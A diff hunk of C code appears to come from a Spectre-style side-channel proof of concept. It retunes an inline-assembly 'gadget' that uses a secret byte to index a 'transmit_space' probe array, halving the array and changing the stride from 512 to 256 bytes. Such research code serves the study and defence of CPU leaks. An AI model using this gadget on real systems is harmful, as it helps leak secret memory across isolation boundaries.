@@ -9,10 +9,10 @@
 #include <netdb.h>
 #include "utils.h"
 
-__attribute__((section(".rodata.transmit"), aligned(0x10000))) const char transmit_space[0x20000] = {1};
+__attribute__((section(".rodata.transmit"), aligned(0x10000))) const char transmit_space[0x10000] = {1};
 __asm__(".text\n.globl gadget\ngadget:\n"
-        "movzbl (%rdx), %eax\n"
-        "shl $9, %eax\n"
+        "xorl %eax, %eax\n"
+        "movb (%rdx), %ah\n"
         "movl transmit_space(%eax), %eax\n"
         "retq\n");
 __attribute__((constructor)) void init() {
